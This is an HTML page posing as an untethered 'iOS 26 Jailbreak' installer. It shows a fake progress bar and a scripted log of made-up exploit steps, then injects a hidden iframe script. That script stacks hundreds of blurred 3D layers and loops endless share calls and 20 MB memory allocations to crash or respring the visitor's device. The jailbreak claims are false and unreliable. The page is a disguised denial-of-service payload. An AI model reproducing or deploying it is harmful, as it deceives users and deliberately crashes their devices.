<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS 26 Jailbreak</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
            overflow: hidden;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 420px;
            text-align: center;
            padding: 20px;
        }

        .header {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 17px;
            color: #aaa;
            margin-bottom: 40px;
        }

        .jailbreak-btn {
            background: linear-gradient(90deg, #1ad2dc, #00c4ff);
            color: #000;
            border: none;
            border-radius: 14px;
            padding: 16px 40px;
            font-size: 20px;
            font-weight: 600;
            margin: 20px auto;
            display: block;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(26, 210, 220, 0.4);
            transition: all 0.2s;
        }

        .jailbreak-btn:active {
            transform: scale(0.95);
        }

        .progress-container {
            margin: 30px 0;
            display: none;
        }

        .progress-bar {
            height: 4px;
            background: #1ad2dc;
            width: 0%;
            transition: width 0.15s linear;
            border-radius: 2px;
        }

        .console {
            background: rgba(30, 30, 30, 0.95);
            border-radius: 12px;
            padding: 15px;
            text-align: left;
            font-family: monospace;
            font-size: 13px;
            color: #0f0;
            height: 220px;
            overflow-y: auto;
            margin: 20px 0;
            border: 1px solid #333;
            display: none;
        }

        .log {
            margin: 3px 0;
            opacity: 0.9;
        }

        .fatal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.98);
            color: #f00;
            font-size: 11px;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
            text-align: center;
            letter-spacing: 1px;
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #555;
        }

        .me { color: #1ad2dc; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">iOS 26 Jailbreak</div>
        <div class="subtitle">Untethered • Supports all devices</div>

        <button id="startBtn" class="jailbreak-btn">Install Jailbreak</button>

        <div id="progressContainer" class="progress-container">
            <div style="font-size: 15px; margin-bottom: 8px; color: #aaa;">Installing...</div>
            <div style="background: #333; height: 4px; border-radius: 2px; overflow: hidden;">
                <div id="progressBar" class="progress-bar"></div>
            </div>
        </div>

        <div id="console" class="console"></div>

        <div class="footer">
            © 2026 <span class="me">neonmodder123</span><br>
            Licensed under <a href="https://opensource.org/license/mit/" target="_blank" style="color: #1ad2dc;">MIT</a><br>
            Modifying without credit is a violation of the license.
        </div>
    </div>

    <!-- Fatal Error экран -->
    <div id="fatalScreen" class="fatal">
        <div>Fatal Error</div>
        <div style="margin-top: 20px; font-size: 10px; color: #666;">
            SpringBoard crashed. Respringing...
        </div>
    </div>

    <!-- Тот самый respring iframe (без изменений) -->
    <iframe id="respring-iframe" 
        sandbox="allow-forms allow-modals allow-scripts allow-same-origin"
        style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.05; pointer-events: none;">
    </iframe>

    <script>
        const startBtn = document.getElementById('startBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const consoleEl = document.getElementById('console');
        const fatalScreen = document.getElementById('fatalScreen');
        const frame = document.getElementById('respring-iframe');

        const logs = [
            "[*] Initializing kernel exploit...",
            "[+] PAC bypass successful",
            "[*] Injecting amfid patch...",
            "[+] TrustCache updated",
            "[*] Loading Substrate/Sileo...",
            "[*] Installing tweaks: Dopamine, TrollStore, Palera1n...",
            "[+] Mounting filesystem...",
            "[*] Applying iOS 26 UI patches...",
            "[!] Warning: Liquid Glass rendering heavy",
            "[*] Finalizing respring sequence..."
        ];

        let progress = 0;
        let logIndex = 0;

        function addLog(text) {
            const logLine = document.createElement('div');
            logLine.className = 'log';
            logLine.textContent = text;
            consoleEl.appendChild(logLine);
            consoleEl.scrollTop = consoleEl.scrollHeight;
        }

        function startJailbreak() {
            startBtn.style.display = 'none';
            progressContainer.style.display = 'block';
            consoleEl.style.display = 'block';

            // Запускаем логи
            const logInterval = setInterval(() => {
                if (logIndex < logs.length) {
                    addLog(logs[logIndex]);
                    logIndex++;
                } else {
                    clearInterval(logInterval);
                }
            }, 420);

            // Прогресс-бар
            const progressInterval = setInterval(() => {
                progress += Math.random() * 12 + 4;
                if (progress > 100) progress = 100;
                progressBar.style.width = progress + '%';

                if (progress >= 100) {
                    clearInterval(progressInterval);
                    setTimeout(() => {
                        // Показываем Fatal Error
                        fatalScreen.style.display = 'flex';

                        // Через 1.2 секунды запускаем настоящий respring
                        setTimeout(() => {
                            const respringScript = `
                                <html>
                                <body style="margin:0; overflow:hidden;">
                                    <script>
                                        const container = document.createElement('div');
                                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                                        document.body.appendChild(container);

                                        for (let i = 0; i < 500; i++) {
                                            let d = document.createElement('div');
                                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                                            container.appendChild(d);
                                        }

                                        setInterval(() => {
                                            try {
                                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                                            } catch(e) {}
                                            let x = new Uint8Array(1024 * 1024 * 20);
                                            crypto.getRandomValues(x);
                                        }, 0);
                                    <\/script>
                                </body>
                                </html>
                            `;
                            frame.srcdoc = respringScript;
                        }, 1200);
                    }, 800);
                }
            }, 180);
        }

        startBtn.addEventListener('click', startJailbreak);

        // Для теста можно раскомментировать:
        // setTimeout(startJailbreak, 500);
    </script>
</body>
</html>
